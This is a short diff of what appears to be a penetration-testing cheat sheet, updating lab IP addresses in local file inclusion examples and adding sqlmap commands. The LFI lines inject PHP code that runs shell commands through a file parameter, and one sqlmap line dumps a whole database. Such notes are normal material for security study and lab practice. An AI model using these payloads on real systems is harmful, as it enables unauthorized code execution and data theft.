@@ -252,8 +252,14 @@ busybox httpd -f -p 10000
 
 LFI
 ```bash
-http://10.11.0.22/menu.php?file=data:text/plain,hello world
-http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+http://10.10.0.22/menu.php?file=data:text/plain,hello world
+http://10.10.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+```
+
+SQLI
+```bash
+sqlmap -u http://10.10.0.22/debug.php?id=1 -p "id"
+sqlmap -u http://10.10.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
 ```
 
 MARIADB SQLi
